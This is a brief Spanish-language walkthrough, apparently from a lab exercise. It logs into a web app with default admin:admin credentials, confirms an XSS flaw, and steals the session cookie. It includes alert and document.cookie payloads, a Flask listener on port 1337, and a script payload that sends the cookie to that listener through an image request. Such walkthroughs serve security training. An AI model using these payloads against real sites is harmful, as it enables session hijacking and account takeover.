Tenemos la siguiente web:
![[Pasted image 20240728092931.png]]
Si ponemos admin:admin estaríamos dentro:
![[Pasted image 20240728093109.png]]
Vemos que es vulnerable a XSS:
```linux
<script>alert('XSS');</script>
```
![[Pasted image 20240728093242.png]]
Y mediante este ataque podemos obtener la cookie de sesión de la suguiente forma:
```admin
<script>alert(document.cookie);</script>
```
![[Pasted image 20240728093458.png]]
Además, dentro del almacenamiento en el navegador, podemos visualizar esta cookie de forma manual:
![[Pasted image 20240728093541.png]]
Para recibir esta cookie desde nuestro equipo atacante, podemos levantar un servidor web con python:
```python
from flask import Flask, request, url_for, render_template, redirect, make_response
import requests

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True

@app.route("/<steal_cookie>", methods=['GET'])
def start(steal_cookie):
    return render_template("evil.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```
Entonces hecho esto, en la web ejecutamos el siguiente payload:
```bash
<script>
  new Image().src = "http://localhost:1337/?stolen_cookie=" + document.cookie;
</script>
```
![[Pasted image 20240728093826.png]]
Y esta cookie nos habrá llegado:
![[Pasted image 20240728093858.png]]
